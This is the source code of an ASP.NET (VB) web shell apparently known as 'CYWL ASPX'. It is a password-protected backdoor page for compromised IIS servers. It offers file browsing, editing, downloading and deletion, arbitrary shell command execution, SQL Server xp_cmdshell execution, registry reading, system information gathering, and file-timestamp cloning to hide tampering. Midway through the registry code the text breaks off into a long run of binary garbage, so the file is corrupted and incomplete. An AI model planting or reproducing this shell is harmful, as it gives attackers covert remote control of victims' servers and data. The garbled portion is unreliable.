<title>CYWL ASPX DM WZJC.CHINACYCC.COM</title>
<%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
<%@ import Namespace="System.IO" %>
<%@ import Namespace="System.Diagnostics" %>
<%@ import Namespace="Microsoft.Win32" %>
<%@ import Namespace="System.Data" %>
<%@ import Namespace="System.Data.OleDb" %>
<script runat="server">

    '---------Setting Start---------
    'Here, modify the default password to yours, MD5 Hash
    Const PASSWORD as string = "b1befef709205575e8e8ba5c5b09e13f"
    'Session name, avoid session crash
    Const SESSIONNAME as string = "webadmin2"
    '---------Setting End---------
    
    Dim SORTFILED As String
    
    Sub Page_load(sender As Object, E As EventArgs)
      Dim error_x as Exception
      Try
        If Session(SESSIONNAME) = 0 Then
            ShowLogin()
        Else
            ShowMain()
            If not IsPostBack Then
                Select Case Request("action")
                    Case "goto"
                        CDir.Text = Request("src")
                        Call ShowFolders(CDir.Text)
                    Case "copy"
                        Call ShowCopy(Request("src"))
                    Case "cut"
                        Call ShowCut(Request("src"))
                    Case "down"
                        Call DownLoadIt(Request("src"))
                    Case "edit"
                        Call ShowEdit(Request("src"))
                    Case "del"
                        Call ShowDel(Request("src"))
                    Case "rename"
                        Call ShowRn(Request("src"))
                    Case "att"
                        Call ShowAtt(Request("src"))
                End Select
            End If
        End If
      Catch error_x
            ShowError(error_x.Message)
      End Try
    End Sub
    
    Sub Login_click(sender As Object, E As EventArgs)
        Dim MD5Pass As String = LCase(FormsAuthentication.HashPasswordForStoringInConfigFile(UPass.Text, "MD5"))
        If MD5Pass=PASSWORD Then
            Session(SESSIONNAME) = 1
            Call ShowMain()
        Else
            Label_Info.Text = "<b>????????????????</b>"
        End If
    End Sub
    
    Sub GoTo_click(sender As Object, E As EventArgs)
        ULOGIN.Visible= False
        MAIN.Visible = True
        FileManager.Visible = True
        CMD.Visible = false
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = False
        Call ShowFolders(CDir.Text)
    End Sub
    
    Sub ShowError(ErrorMsg As String)
        Label_Info.Text = "<font color=""red""><b>Wrong: </b></font>" & ErrorMsg
    End Sub
    
    Sub ShowMain()
        Label_Info.Text = "111"
        ULOGIN.Visible = False
        MAIN.Visible = True
    End Sub
    
    Sub ShowDrives()
        Label_Drives.Text = "Go To : "
        Label_Drives.Text += "<a href=""?action=goto&src=" & Server.URLEncode(Server.MapPath(".")) & """> . </a> "
        Label_Drives.Text += "<a href=""?action=goto&src=" & Server.URLEncode(Server.MapPath("/")) & """> / </a> "
        dim i as integer
        for i =0 to Directory.GetLogicalDrives().length-1
             Label_Drives.Text += "<a href=""?action=goto&src=" & Directory.GetLogicalDrives(i) & """>" & Directory.GetLogicalDrives(i) & " </a>"
        next
    End Sub
    
    Sub Logout_click(sender As Object, E As EventArgs)
        Session.Abandon()
        Label_Info.Text = "<b>???!</b>"
        Call ShowLogin()
    End Sub
    
    Sub ShowFileM(sender As Object, E As EventArgs)
        ULOGIN.Visible= False
        MAIN.Visible = True
        FileManager.Visible = True
        CMD.Visible = False
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = False
        If CDir.Text = "" Then
            CDir.Text = Server.MapPath(".")
        End If
        Call ShowFolders(CDir.Text)
    End Sub
    
    Sub ShowFolders(FPath As String)
      Dim error_x as Exception
      Try
         Call ShowDrives()
        If right(FPath,1)<>"\" Then
            FPath += "\"
        End If
    
        dim xdir as directoryinfo
           dim mydir as new DirectoryInfo(FPath)
           dim xfile as fileinfo
        Label_Files.Text = "<table width=""90%"" border=""0"" align=""center"">"
        Label_Files.Text += "<tr><td width=""40%""><b>Name</b></td><td width=""15%""><b>Size</b></td>"
        Label_Files.Text += "<td width=""20%""><b>ModifyTime</b></td><td width=""25%""><b>Operate</b></td></tr>"
        Label_Files.Text += "<tr><td><tr><td><a href='?action=goto&src="
        Dim tmp As String
        If Len(FPath) < 4 Then
            tmp = server.UrlEncode(FPath)
        Else
            tmp = server.UrlEncode(Directory.GetParent(Left(FPath,Len(FPath)-1)).ToString())
        End If
        Label_Files.Text += tmp & "'><i>|Parent Directory|</i></a></td></tr>"
        For each xdir in mydir.getdirectories()
            Label_Files.Text += "<tr><td>"
            dim filepath as string = server.UrlEncode(FPath  & xdir.name)
            Label_Files.Text += "<a href='?action=goto&src=" & filepath & "\" & "'>" & xdir.name & "</a></td>"
            Label_Files.Text += "<td>&lt;dir&gt;</td>"
            Label_Files.Text += "<td>" & Directory.GetLastWriteTime(FPath & "\" & xdir.name) & "</td>"
            Label_Files.Text += "<td><a href='?action=cut&src=" & filepath & "\'  target='_blank'>Cut" & "</a>|"
            Label_Files.Text += "<a href='?action=copy&src=" & filepath & "\'  target='_blank'>Copy</a>|"
            Label_Files.Text += "<a href='?action=rename&src=" & filepath & "' target='_blank'>Ren</a>|"
            Label_Files.Text += "<a href='?action=att&src=" & filepath & "\'" & "' target=_blank'>Att</a>|"
            Label_Files.Text += "<a href='?action=del&src=" & filepath & "\'" & "' target=_blank'>Del</a></td>"
            Label_Files.Text += "</tr>"
        Next
        Label_Files.Text += "</td></tr><tr><td>"
        For each xfile in mydir.getfiles()
            dim filepath2 as string
            filepath2=server.UrlEncode(FPath & xfile.name)
            Label_Files.Text += "<tr><td>" & xfile.name & "</td>"
            Label_Files.Text += "<td>" & GetSize(xfile.length) & "</td>"
            Label_Files.Text += "<td>" & file.GetLastWriteTime(FPath  & xfile.name) & "</td>"
            Label_Files.Text += "<td><a href='?action=edit&src=" & filepath2 & "' target='_blank'>Edit</a>|"
            Label_Files.Text += "<a href='?action=cut&src=" & filepath2 & "' target='_blank'>Cut</a>|"
            Label_Files.Text += "<a href='?action=copy&src=" & filepath2 & "' target='_blank'>Copy</a>|"
            Label_Files.Text += "<a href='?action=rename&src=" & filepath2 & "' target='_blank'>Ren</a>|"
            Label_Files.Text += "<a href='?action=down&src=" & filepath2 & "'>Down</a>|"
            Label_Files.Text += "<a href='?action=att&src=" & filepath2 & "' target=_blank'>Att</a>|"
            Label_Files.Text += "<a href='?action=del&src=" & filepath2 & "' target=_blank'>Del</a></td>"
            Label_Files.Text += "</tr>"
        Next
        Label_Files.Text += "</table>"
       Catch error_x
               ShowError(error_x.Message)
       End Try
    End Sub
    
    Function GetSize(temp)
          if temp < 1024 then
             GetSize=temp & " bytes"
          else
             if temp\1024 < 1024 then
                GetSize=temp\1024 & " KB"
             else
                if temp\1024\1024 < 1024 then
                       GetSize=temp\1024\1024 & " MB"
                else
                       GetSize=temp\1024\1024\1024 & " GB"
                end if
             end if
          end if
    End Function
    
    Sub ShowLogin()
        ULOGIN.Visible= True
        MAIN.Visible = False
        FileManager.Visible = False
        CMD.Visible = False
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = False
    End Sub
    
    'Show Cmd
    Sub Button_showcmd_Click(sender As Object, E As EventArgs)
        ULOGIN.Visible = False
        MAIN.Visible = True
        FileManager.Visible = False
        CMD.Visible = True
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = False
    End Sub
    
    'Show clonetime
    Sub Button_showclone_Click(sender As Object, E As EventArgs)
        ULOGIN.Visible = False
        MAIN.Visible = True
        FileManager.Visible = False
        CMD.Visible = False
        CloneTime.Visible = True
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = False
    End Sub
    
    Sub Button_showcmdshell_Click(sender As Object, E As EventArgs)
        ULOGIN.Visible = False
        MAIN.Visible = True
        FileManager.Visible = False
        CMD.Visible = False
        CloneTime.Visible = False
        SQLROOTKIT.Visible = True
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = False
    End Sub
    
    Sub Button_showinfo_Click(sender As Object, E As EventArgs)
        ULOGIN.Visible = False
        MAIN.Visible = True
        FileManager.Visible = False
        CMD.Visible = False
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = True
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = False
        ServerIP.Text = request.ServerVariables("LOCAL_ADDR")
        MachineName.Text = Environment.MachineName
        UserDomainName.Text = Environment.UserDomainName.ToString()
        UserName.Text = Environment.UserName
        OS.Text = Environment.OSVersion.ToString()
        StartTime.Text = GetStartedTime(Environment.Tickcount) & "Hours"
        NowTime.Text = Now()
        IISV.Text = request.ServerVariables("SERVER_SOFTWARE")
        HTTPS.Text = request.ServerVariables("HTTPS")
        PATHS.Text = request.ServerVariables("PATH_INFO")
        PATHS2.Text = request.ServerVariables("PATH_TRANSLATED")
        PORT.Text = request.ServerVariables("SERVER_PORT")
        SID.Text = Session.SessionID
    End Sub
    
    Function GetStartedTime(ms)
          GetStartedTime=cint(ms/(1000*60*60))
    End function
    
    Sub ShowReg(Src As Object, E As EventArgs)
        ULOGIN.Visible = False
        MAIN.Visible = True
        FileManager.Visible = False
        CMD.Visible = False
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = True
        DATA.Visible = False
        About.Visible = False
    End Sub
    
    Sub ShowData(Src As Object, E As EventArgs)
        ULOGIN.Visible = False
        MAIN.Visible = True
        FileManager.Visible = False
        CMD.Visible = False
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = True
        About.Visible = False
    End Sub
    
    Sub ShowAbout(Src As Object, E As EventArgs)
        ULOGIN.Visible = False
        MAIN.Visible = True
        FileManager.Visible = False
        CMD.Visible = False
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = True
    End Sub
    
    Sub ShowEdit( filepath as string)
        ULOGIN.Visible = False
        MAIN.Visible = false
        FileManager.Visible = False
        CMD.Visible = False
        CloneTime.Visible = False
        SQLROOTKIT.Visible = False
        SysInfo.Visible = False
        Reg.Visible = False
        DATA.Visible = False
        About.Visible = False
        File_Edit.Visible = true
        edited_path.Text = filepath
        dim myread as new streamreader(filepath, encoding.default)
           edited_path.text = filepath
           edited_content.text=myread.readtoend
           myread.close()
    End Sub
    
    Sub ShowDel( filepath as string)
        MAIN.Visible = false
        FileManager.Visible = False
        File_del.Visible = True
        label_del.Text = "Are u sure delete file/Folder <b>" & filepath & "</b> ?"
    End Sub
    
    Sub ShowRn( filepath as string)
        MAIN.Visible = false
        FileManager.Visible = False
        File_Rename.Visible = True
        btn_rename.Text = path.getfilename(filepath)
    End Sub
    
    Sub RunCMD(Src As Object, E As EventArgs)
        Dim error_x as Exception
          Try
        Dim myProcess As New Process()
        Dim myProcessStartInfo As New ProcessStartInfo(cmdPath.Text)
        myProcessStartInfo.UseShellExecute = False
        myProcessStartInfo.RedirectStandardOutput = true
        myProcess.StartInfo = myProcessStartInfo
        myProcessStartInfo.Arguments = CMDCommand.text
        myProcess.Start()
        Dim myStreamReader As StreamReader = myProcess.StandardOutput
        Dim myString As String = myStreamReader.Readtoend()
        myProcess.Close()
        mystring=replace(mystring,"<","&lt;")
        mystring=replace(mystring,">","&gt;")
        CMDresult.text = "<pre>" & mystring & "</pre>"
          Catch error_x
               ShowError(error_x.Message)
          End Try
    End Sub
    
    Sub GoCloneTime(Src As Object, E As EventArgs)
          Dim error_x as Exception
          Try
          Dim thisfile As FileInfo =New FileInfo(time1.Text)
          Dim thatfile As FileInfo =New FileInfo(time2.Text)
          thisfile.LastWriteTime = thatfile.LastWriteTime
          thisfile.LastAccessTime = thatfile.LastAccessTime
          thisfile.CreationTime = thatfile.CreationTime
          Label_cloneResult.Text = "<font color=""red"">Clone Time Success!</font>"
          Catch error_x
               ShowError(error_x.Message)
          End Try
    End Sub
    
    Sub CMDSHELL(Src As Object, E As EventArgs)
            Dim error_x as Exception
          Try
            Dim adoConn,strQuery,recResult,strResult
                 adoConn=Server.CreateObject("ADODB.Connection")
                 adoConn.Open(ConStr.Text)
                 If Sqlcmd.Text<>"" Then
                    strQuery = "exec master.dbo.xp_cmdshell '" & Sqlcmd.Text & "'"
                        recResult = adoConn.Execute(strQuery)
                     If NOT recResult.EOF Then
                        Do While NOT recResult.EOF
                            strResult = strResult & chr(13) & recResult(0).value
                            recResult.MoveNext
                        Loop
                     End if
                     recResult = Nothing
                     strResult = Replace(strResult," ","&nbsp;")
                     strResult = Replace(strResult,"<","&lt;")
                     strResult = Replace(strResult,">","&gt;")
                    resultSQL.Text=SqlCMD.Text & vbcrlf & "<pre>" & strResult & "</pre>"
                 End if
                  adoConn.Close
           Catch error_x
               ShowError(error_x.Message)
          End Try
    End Sub
    
    Sub ReadReg(Src As Object, E As EventArgs)
              Dim error_x as Exception
        Try
              Dim hu As String = RegKey.Text
              Dim rk As RegistryKey
              Select Mid( hu ,1 , Instr( hu,"\" )-1 )
                 case "HKEY_LOCAL_MACHINE"
                    rk = Registry.LocalMachine.OpenSubKey( Right(hu , Len(hu) - Instr( hu,"\" )) , 0 )
                 case "HKEY_CLASSES_ROOT"
                    rk = Registry.ClassesRoot.Open€Ö”ßé?$C0“õÍ§¬	³Ä@9Hw­rHo?¸q÷%ÿÜãüJPÕH]Hwşæ/oˆ)öEéz†ú©z™+²V¸6/*¸d’e`·8ÒÓ©ãê¢îì` ³”÷îèĞ0…±9ÉëL|Â	p‰6‰)ÔY¥…Fãw½YW†OõşÁ­ftìàUGx÷>h’BPÈÉÔªgö1‰Ö³/|ÌL>s\_\ËêGLu¤’ğ‡ö·ÍÑAwSqmß;B»`¥¶º“p`zKëÏ0²\ ¤ëÒ9¥ãbútv  ´>Pß¸eÂÇN€XñÅG¾¡ñf¶‚ä€"]ª•ıE%È	v‚Y)OÜ” jÀ·Å(h}ÌìÒNp!ëAC_’PX®¥ú7]%›,Y.È¯ÇğWäÌóTo8¿'.äÎPX>ú¸ªà}°OLÿ13=e)ìaØ&×º’<Ån›‰."óWÊ÷èc€ú22€šå^æùlñ#*·ÃF? _øE.¿8©ÜÏr;¥Ø KÃ§Ñıq/³Õf!7ôOãZV·"ŞS™ªttáLÖ)8ÖÙ[=¨z,İ˜¯š´zñƒ!`wÅJü”Í“8BñÒJ/>‹Á²îC/I$Ëå‘ö]Wsş£»O3EqÉQî?SìÔø	á.ù€KT&-üz”{¡¼LT}î”·ï¦üï]ï¥Î7ƒÅV¤²dr¿b¢üh’U.Ü7m –§İ\º²°1u×ÆŒeÂcñõÿhFè
HT4Õï¶q8ÖR†"/¸nîëNÁÇ÷ŠÆPŠ*z?ËZWÄ«wß¬h”Ç‚à6Ø»QıÀÓ‰ß’v‰<‚”-	IQ‡ª«iIÚÆøö:Êîí?ü˜¿}Ú1ªEâbµ¼Wú<ÚÀ´H¨®œZC•5º­½O–I&HêÜM#·¨NÜğ3¦ªG#GàM3÷V,rôşX†?YD`G„lGÂíU«‰Ao^@€nÈŒ¢ì-Hp¦¬sÑS’ƒ÷Ì!‚Tr°´µÀ:…-uˆNR¯vµZ	ÄõãìûÌÅJ\0¥õüÁ|èã~èµ³®[¦~ØëñDş0cÔÇşc©Ã,ã)œb+ğ2´«o‚Ç_)S`¸¦¿må`TÃÿ9âvbã%Œ$è°}¡ù°ìÃ-ş±*ã]}Q¸rıŞgùĞ.ofÓ¸ò¦µpØ(6‰¢×GNÈ=™#´İ˜eİš©rÓYøF7H¦t=üŠB)ßi…-©"âX+ëô	2š"»w)g%{5‹¹¶,ğ³SƒœæÓ>!½Œ`â’˜¿Õ4Ó?¤HB·©ÆeÚLuköìzÂ¼ÎÑÕ]Ì{7¼n
)6&Ë.šÌ!áX"ÃØhšÜ—ë'ùÓ_5­lÄ†.G/ãß‚ÉhŞ¬äş¥HÉVeHSb¡ p-À®!ÊxâŒrß®¬	ˆ£şè·•}|ºgøú‰‰vÈ s…{«˜$×—Ó'ùĞ šÔ˜©:’ œŒ8`£¢Ö!@ÃÈYøÁØmªSğkŞ/kÅEÕŸÁ±­¼N!‡jç9¥dZÑ_[µŠİ$m„i´pÎÂÔ8kÄÎo1ê-4=”ßóÏqs f¢*/éµaC¤±zHÌ~6¬Ö5¶Ø¶‘ï¤éåÌÉzÒòwo5í3I9Çèg%<wKSl­ÈÑGä/*hû  I1>¼KÜ«Eú^À<Ä®:ó[í;äå`—ƒ~”àS|†EŒì/âQ>`”!2²?RÅF°,[ºV-Ì•™EKk+Ú®µ>ß–¾l¡'şßbÆr€Øz•;Å¬×áë§Ş‡9e‚‰.íöœMå(òFê…+xcû-)g¨,x¤„“šÂC½vØ©“—?%mƒùDû
@èÙ¢´âûF^€d”Ò,•×Â±“CªÒ²°sR|2¾ƒ³ûn²ë6a8iµmè ‹Æ–~*‰üíGQ·SC` ;Š:b&¥ôP×±ŸÁ· ‹ëmPÔ,´Øx«â€’³iî©ÂP~"2°a…iÎy»r‘`Õíò3ĞÖNˆãÔ<29ı$ü½Å.ìº‚\`hP4te$ú'Şœçò¨·+H#çzˆ>á~zÙÓ—©fˆï›ÈdL·Y§±§#:ˆ8O=pİp_
 IŸã$ ¹À#!rcòÌ%„—Š<ß°-ü¶ZdQé»ÜKï’~ÆwÃ†©}ö¥XÔòÒÈ•«¬-_‚vé\ê&Ô3×	
èıßùg3phJ¨â“+äÚ*+ªäÌ!áØhúlsm}J›Ì	ğú>],”&ûw÷R~:¤”‡A@şlrÏ§ú”:vİ\„o^óĞ•`cÂÀ¼¿Äí÷q3MÊ®oõØCJŞK¹;7üy%ÇxV˜Àb.åèFEb%Küu[  ÌU­EÚüù©“”d´¶ò¥
ĞKê}n›Á*sóVn·	à†çYƒPÊyñ^saèI6.Hä0Ş§À4YÂ.´¡HXá·7:¯º2×RvHÌ©ZJÉ®,0‹èG„Š<	õ2÷˜ß8–¤·0ş˜¨![ë^½TäÈL‘OÊ™y!4­­.{:ÕÈ3éx4ÿà«²Ni–S€Ûè…ğúèfIH'XÉs%}Õ8÷s¤s)Rï=‰H·VÁ@G-%¨ +–‘æê!swö2!KØFZ†ëÆ£'¦ZN(£ìx4Í3›ŸMÏŞ»VBÁ+-U¶óDöMàÂá)so‰[´>©|×ˆèÑ­5©v…>¶,B$ËËŸªÊ:ó‰Sşã-Â0‰ŞÔõNNp8+ ¢Vw>ïáŒ’DÙ±x¨ÌıòÊ‹©&®[Ä4ü©ëüyÌû˜—WmJŠáLo!|]:³
Ğ…$‘å£r¿ğÀãy #Şñ”¦7§‚%Š.2r„Î§¢ı§.Ç‚ïÁ7×§©™ÂÀÏc³Ú¢Bjñ°·|-7¯ÚFØúd¯Êÿª¯y¯wÕõ€ÿ×5àøØ°İQvN6(LÆÈøŒÓw‡#cÜlá&>ß†Ä¤¹{±£ËWîBxGh‰¦ìú‡ô[¤[ÔÂÇ¶ÑzÀUÚT¨/’ª6ÙMë,ßS`„¢7âùâ2Àtä+‘eîè<_{„9¦ˆôÒSçdNæÊ“šüïkDŒŞ}Óª* S|MmÔÍ*õ£êB¨‚tNXÂ Z“wiùsiwÃ
E±uØUO,Ìò)¯Ù—°^H`ÔÚç§„ãš7D/j+´ùo¡6H¿^Pÿ¨NftŒ‘rUŸH2Õ†^gA—“0&ş’“™Õaİvõ…laxRâQUº Âab.À5Woä€¤¡H¼<5²yz£d†ª„Î÷B)ĞºùÒ<ç›hÄ2Öj5ëIoÜ§lâ8š	{ì*È½&ˆ‡=gÁÔ°Y
Øw[iR/²²ìşZnŒ£/–¥ê.¢p-#ƒÈàÍYÔíÇ€Ò*cÑÇìŞsÙJP‘€zÃO¡h‘R$
›%H£Ê®¼‘¸isõØä§¾Ë¶×İ#5ğèEN9·ùŸş–Ú21HÊz:$"§.÷IÌ}jßpâp¸}AÙŞawº€É,¬÷,2{ªš ±§ŸËÏØCô½lm¨í*¯@ÿÚÿ‡ö‡[ ñ½XÎ€ıÇîƒ„e,x8‡ı7VÀæ’àeÜGI–§¸…é¤ô‡ˆèjÍtŸ·š»Ÿ ìH­‡•¡u‰+ZaĞ^Íİ7&µÌ"C*‚î(lMGÂa\Nß^$s°8’*€Ï)…sÖãqg|9«?òÖD”Ç­ÜÍ¦"	õÂäÒ-Õ4?!¢Ä¾:%—â•(£	qÆ”ç’s¼à¢Ô—ˆÕş¢ÅA%‚ù]yëç`ÁfDİvr L­óFÒEæ²ë oøê`$øU4e·ÇÉ'uşTŒc\‘gXì¶i>Ój.éĞXöÜpoVöæVŒ•'uV;,!.òÛüVµüPgŞªÄÂ³TÛç<6ozDÀç/,Òa¬¯3y9…ÌC`0¬ T˜vÇzµö¥ÎŒñªPŸÎ²†ke¸<ƒt¼E{œÀŒW¿Á–õòË,şãuîˆ<²kª§Òíª¨ŞÒ4”mÔ,í|"0½[¼Æım@4m¦-±·>A÷!f¥JÀ½’€*¥ÊÄÀÈ€Æ</‰uëÿ»‰Mßâ_?`Ş^	@™R•‰Şj}'ğÄ3€ü¦Gr}îÿ,ÔÖú8şÛÒTÕÆ}{œÏ*t2 7®©K~ùÉœÿ†GÌ ÑÒöıô˜iØ´˜Œ {€¬?7°À¼îèFaYrİ·Óñq5^éxS­v¤cú5ÈªÜÿ_è†öİ@™wi¸I şŠ
­X¹•²åÉµİÍvòS-d¢(-ƒöØ(tÜ]fÄtö¥A§ş “-	ìX;:§p'S¼Ó#­@év*ÂÜd²˜¯ ¾*¢QJ°ü2",ã#ZÉ%ù‚Á7@LIÎ#8?[I…,İ™	‡ÍìŠ[ÄSÈU’~v†–A­d(2Èiß¿nıV^&ö‹~Â%aÚÓ[›x¼{Wî5ÃÖË)v…ÈË[æãÍ¥Çá^Ûİ„ÿÇgõ0l_`µÌ©uçmÃ}ÂÆÒë³nkÄ…wíÛŠÈ¼$ûÊmİşÅ#úçN,u‚ÉM!&Æ@ûšƒ[|zä#ÌPK¹„ww_¯UÜÍÿ£5ı±î;mÖSËÍxB[X÷ÇlÌ5ı`$ÌÎ¿0GæxÎ[¹zM×:ÊúçíGáûH–K2NÎ;µ«gÔ€Id²=H;å$~2YFÒj©¬Ø¹ RT¼EÜ>\Îò€\.şËœt÷Nø“Mì@¡…XXèá©·t?DS
Of€wÇÖÙà/Ù"FUªã|ÿã-)õí	P¼Ó‡õéôEã#ëZù”ïñ€j¡w¡Îáß@mi‘Ú©A’=C‰Â ;'zOƒY‹ëë¾cöœ7ÕëÒ1;TuÖÎT4*bš4ÿRHò¬äJÏOûo_ÚÉéy‹´	ï® Ó…ËQVá-ÎyÜİ[İLiŸ6¸Ğ6.bß;;O&A]ÑFI·fš:ç©ÙÜ•ÒE¹@¦º tÊİ5º	hr*HëZ;¬ÊªKÎs"Ò1¢¡¼_/#ìvôËD•0só	TY@É”@}lÎX¹ü:LÕ5*·kØê‰úGÒË…Æô»á¯`ÕièÃO±ÇÕ¼Öò§&Œ\A‰Û±C©G=üÁk90!h¹~³H[×Ù‹zéOOâ<¤;Š¾EË®Ú[nÕ…˜êh°'5WkZE‹+PÚ"-Û¿u¶F†w·v×$¶ü­3é±¹HãŸëQj96~ì@c¡Z“ï/ ÇŒW–âj‹-¶QÍ0eM¦~vFşÄù_ÊaûãP”çŠÊãß³¦6 ²-Ói¨³Ïå 0ÂØğÆQq4Öf]§‹1£áP#ò]1C¼‡LO†”
6ïçu«W@ “Ü¼{P…†u£Hí˜ûxjWÈän&*ğÓ®IÄĞ5*NE©´cKµX¨©²‚÷õ6Ş]o ïI:öÓjSÎ ‘]>bâ‘Ìñ¡ÖqÏî!«öšÎz;²“‰n4¡$³9˜Çœ‚²(<¿,•¯âŞÜÛ9a¯Ê[Î"Æ§ÿ\Û€×b·)Ùdm !Ã	 xİø=¢¼Øá‡A×k–ŒêÚ¦8T| õıŸU=C¥K”yõ[š#r¾G¼âã¼TÖB$IŸz&BOÅYÚ%"\ú¢¿îBÁÄVH —=¾hù#\!(r}W¾İŒº‡½vÒÆiÿ·ÂÅ
ÆE‰ÍMz— Ì ÕÍ/+UÛ¦äÂÙT£ÏÆä¨ênrM¼Q	¨É^š	­Â¶5‘{¯¤‰)Ë”÷?»ıÒV½±mVô¦$Qœ Xuûƒê÷ş-(²c,>'.ÖÉĞÂ?®îóÈŞÀ¹ìá)œ Úšz´4x“¬ î>*sêqä+¢Ç¾ĞˆY“û¯â¤|ãTpï™İĞ$G•(>°Áæìœë>lP20Q/ŸXºy÷sz§‘Ã7bÓy1:±’Ì9J…z1“ÒUİ`Ü)n à†>¡Å@š}ë©ÏD3T”Ÿ{ÓîLó *ı2ˆQÔ/ì¶nâ,Èë¶|‹îtBe °¯FNÀ×p^]é€$ıùú>>Ÿa1,æ¡½n¤Áï×üTCoY†v¿Š•:ËŸõQ¦+µS:çÓÎ?ÿD
Û¦ãƒ±¹Cx‹YÍ_~ ÊÍ¦»[?ˆ€æÛ2NÖİ¾›’¾àxm©‰p’ÆÁlşÁö³R?tÙ¯ØRš rÊŒŒlc&³Á£_*âRÃ©æ®cÖˆşdÊSE ²g“\fÊrtÎtbIªÛ_XûKWJ½³q§ëcZ¨¯Ñ´†:š¡z^¸$¹öÕœ<şèMãuF9¢6İ¯Ç*ıËxÓò"CÓúÂı~ñ]Ç¼õPf<SN!^w ó>c6³&q½nƒ9RŞãÊ\ßŒ¢ºICÑ”DçşUº7v_Ùˆ¡IøHæE4e¼8¸0Q&ÊÿuJ©CVXV¿bérL[âœBm[L¬ßêD›4!¯â!…â‹D“Îæ‰)ù2†‰Õ%™HÄä§7Bcvç‹ÉØÈşº¦Š9Kï9´ª×P•ïdİ%y±¹Š™$OlŠŠ)‹ù¯Êf’·N&<ûF¹u’=ÿÜá½ãƒ>‡ÁŸu:l&½?ô?—Çı´£ctA8Hdêã´Ì‚ŠäRÃñ/{æ¥–Ğë|´”¨Ñß_Pî`6›V‘~À£Òÿ#óˆùmš”—¬Ea&/I/sõa ‡;H˜¶<å4$S¼¡H\f‰‰jV@X»¦×w%¯Œ:ĞQ£Éú5sPE“ì<3û@‘›Zt‹•¾’gà#9sÄ½:AßÑ'˜	06’‡~ä(T„]»t•›·¡|<{G@Øƒ{eè+)µ&wÈË¦33MƒŸ½¾<±p£*Uv‘%Ú2%oğé™³ƒ¼åøgÇ-Ä,a§
é„À>ƒ&y‡ş»§T¢mÿ’FïzW”³ŸŞÑe/2í6Ó!ÅhIî
8SW¼ZŸy¾^œfsƒRœòa–[%ŒŒæ]Éà.÷xú¸v!hÙL"™¢,ªÕö9Š €7°ìWâ„3×±€1ÿ&­-SX“ûmwä3»¢­‘®´M|¿F„3ªJi–×éS¡ÍS…¿àÉ—ƒBÃ(3bX@;#ñRbù¸vÜ­Œš"£mø™îp}ãzáÔ2Æó«cİmİˆşt“°ò	 9,ÏÍª9ÇìY‡[F/m­	ê÷ÖÄ~¦á¤k1Í;lÔ\|È:ÄüµhåiÅ×²Ëô¯ÇìàZ<Hœ£}pF¥kLß²\ Ëx:xÆÕó&ş"Ø3IÊ]ÕŒílPcd–ôõaÍ:í Ñli$™ÍÁ!7î7À@|Ì9™ğà¤Ëº°FùÌ‚(‹bÁU~æk¤¢ŠIşvÌ•Ôº9<Êp'B×kÒxœ¦€*”Â™’i}æâÒ|×Áñ 	İ©3®4Bù?g†ø¿{H×ä,ªPM¿I¿%qI¹¿½ít,*0Û±4¸ãÌL~¢eÕÑ¤Š3İ‚8ë
iGHJŞcÜ:ÉB´cbªg´¦Æmš´àŞ6‚n±kş.àÁb. r8áœSıº‹7Q_¶ŞcIW[È¡™ÒnZc>È•c‚ «ÀèíëçñÇ#´@†2ì«]á>ØŒ…¾E4q`ÕêŠ1‰_äAú?U²¼p%/âzÄ…N‰]ì„.
&šâ‡£s-ëñ:Er­u,JW‚;–À}ÿÎB³ğC³ØD9wxéù:|bªÅK–1Çˆ –®mV‡3=¨ÕéÅŒ r·Lµƒì‘:„.a{	2;4TÇL»ÁÇIÎ\$P¨œUC`g‡Ğ^‘H;¯\œ¥F˜?Xbm‘mL?•şl‹Y×¡øÈÓ “âCË´G£YBÁŠrâ^”lAn…,LÒ’±Pì”úÀ@^;	²Ù½bÙ[ƒ4Ø£Šß©!}Í­~!™{¡A¬gøı_F(ò§§ÌÓ4'”÷ÍiÜ—à**‚¾ÉTÍ‰“w–Br|W$:x. Î»	¾ ÿØ3<=‚Ù|ğ$8x¤•s÷¯Më6^taÔfe£z—Çj xÿ§î0¤!Q¬ì«^^>#ßåÛ´¤ïwÄºüÂXÃëˆø]ä^rƒxe/XXßkëwAS¸nNp”âRÕŒ[¡µJ7ºås7SıŸ£øN!7$rÀŠdb@ZÙoŸDû>yüş¼ R©W¥ò¸ò‘A‹æ3Mgç)ñ|kdŒ7y|ùé:1ş¦à\6$2JVcÉ—5OVw¢¸Ch¤Ñı%ÓxÖè4øù¡\f\•Î7l˜õ/‹êrÏ(1¤jæ¸‰rU—ÊD¦ ÑÊşõò#`Ø¹t¡m¢[øóvt‡¬ú·PZ!QÄÅ4ÉO¤C*Wß@{2=Ák­™|ìë©G°+ØÛš{€FwgØÒÖ`FìÈ†1ÃºwpÒ?`>U¾«Ã˜7ˆÎÓÕ0›ãÀ‰Òñ2± .l—äËïTÑÈ+ãÄá„ âÂ`Í‡*Æ®ÂÔk?ÈX‘‹öí‚vÕgåäfw8˜í¦ÜÀŞ9kWkÎü¼–Òûêğ¥1ƒl²hD@Ür_µ2›O-ù)ùa>”Dy†M¿s[ÖJï[ˆ*‰¿»	ët“‡İ9LovşN³%e©BË¥~5ÿ®5_ÆG²Fb2‡Ê 